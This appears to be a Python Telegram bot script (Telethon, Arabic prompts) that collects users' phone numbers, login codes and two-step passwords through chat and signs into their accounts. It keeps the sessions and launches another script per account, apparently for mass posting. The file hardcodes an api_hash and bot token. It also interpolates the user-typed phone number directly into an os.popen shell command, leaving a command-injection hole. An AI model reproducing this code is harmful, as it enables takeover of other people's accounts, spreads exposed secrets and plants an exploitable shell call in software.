from telethon import Button, errors
from telethon.sync import TelegramClient, events
import os
api_id = 2192036
api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
bot_token = '6020359840:AAFLaZSOPD5iqZ9RJOlRLJSXhLIAAmx4x-U'
bot = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
async def Add_NUMBER(event ,phone_number):
    try:
        iqthon = TelegramClient(phone_number, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
        await iqthon.connect()

        if not await iqthon.is_user_authorized():
            request = await iqthon.send_code_request(phone_number)

            async with bot.conversation(event.chat_id, timeout=300) as conv:
                # verification code
                await conv.send_message("__ارسل الكود الذي وصلك.. ضع علامة ( - ) بين كل رقم:__")
                response_verification_code = await conv.get_response()
                verification_code = str(response_verification_code.message).replace('-', '')

                try:
                    login = await iqthon.sign_in(phone_number, code=int(verification_code))
                except errors.SessionPasswordNeededError:
                    await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                    password = await conv.get_response()

                    await iqthon.sign_in(phone_number, password=password.text)
                    await iqthon.disconnect()

        return "تم اضافة الرقم بنجاح ✅"
    except Exception as error:
        return str(error)

@bot.on(events.CallbackQuery(data="add_number"))
async def Callbacks(event):
    await event.delete()
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message('Phone number ?')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text
            phone_number = phone_number_msg.replace('+', '').replace(' ', '')
            open('prift.txt', 'w').write(phone_number)
            await conv.send_message(f'''ثواني''')
        result = await Add_NUMBER(event,phone_number)
        await event.reply(result)
        c = os.popen(f"screen -S {phone_number} -dm bash -c 'python3 new_nshr_DEX.py; exec sh'")
        if c:
            try:
                await event.edit(c.read())
            except:
                await event.edit('True')
        else:
            try:
                await event.edit(c.errors)
            except:
                await event.edit("False")
    except :pass
async def StartButtons(event, role):
    if role == 1:
        buttons = [[Button.inline("➕", "add_number")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)


# BOT START
@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    await StartButtons(event,1)
bot.run_until_disconnected()
